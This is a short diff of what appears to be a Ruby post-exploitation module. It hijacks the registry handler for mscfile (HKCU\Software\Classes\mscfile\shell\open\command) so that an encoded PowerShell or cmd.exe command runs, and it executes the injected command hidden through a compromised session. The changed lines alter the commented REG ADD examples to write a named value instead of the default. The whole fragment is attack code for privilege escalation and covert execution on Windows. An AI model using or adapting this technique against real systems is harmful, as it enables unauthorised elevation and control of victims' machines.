@@ -276,8 +276,8 @@ end
         end
 
  # Execute process hijacking in registry (cmd.exe OR powershell.exe) ..
- # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "powershell.exe -nop -enc aDfSjRnGlsgVkGftmoEdD==" /f
- # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "c:\windows\System32\cmd.exe /c start notepad.exe" /f
+ # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /v isolatedCommand /t REG_SZ /d "powershell.exe -nop -enc aDfSjRnGlsdD==" /f
+ # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /v isolatedCommand /t REG_SZ /d "%windir%\System32\cmd.exe /c start notepad.exe" /f
  print_good(" exec => Hijacking process to gain code execution ..")
  r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit 'enigma0x3' :D
